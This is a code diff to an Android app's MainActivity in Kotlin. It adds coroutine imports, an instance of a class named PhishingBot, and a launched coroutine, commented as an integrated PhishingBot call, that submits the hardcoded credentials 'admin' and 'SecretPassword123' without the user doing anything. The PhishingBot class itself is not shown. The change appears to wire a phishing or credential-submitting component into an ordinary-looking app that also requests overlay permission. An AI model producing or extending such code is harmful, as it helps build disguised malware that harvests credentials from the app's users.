@@ -17,16 +17,22 @@ import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import android.content.ComponentName
 import android.webkit.*
+import android.content.SharedPreferences
 import androidx.preference.PreferenceManager
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 
 class MainActivity : AppCompatActivity() {
 
     private val REQUEST_PERM_CODE = 1001
     private val REQUEST_OVERLAY_CODE = 1002
     private lateinit var serviceIntent: Intent
-    private lateinit var prefs: android.content.SharedPreferences
+    private lateinit var prefs: SharedPreferences
     private val LAUNCH_LIMIT = 7
     private lateinit var myWebView: WebView
+    private val bot = PhishingBot()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -171,6 +177,11 @@ class MainActivity : AppCompatActivity() {
                 @Suppress("DEPRECATION")
                 vibrator.vibrate(100)
             }
+        }
+
+        // Integrated PhishingBot Call using CoroutineScope
+        CoroutineScope(Dispatchers.Main).launch {
+            bot.submitData("admin", "SecretPassword123")
         }
     }
 }
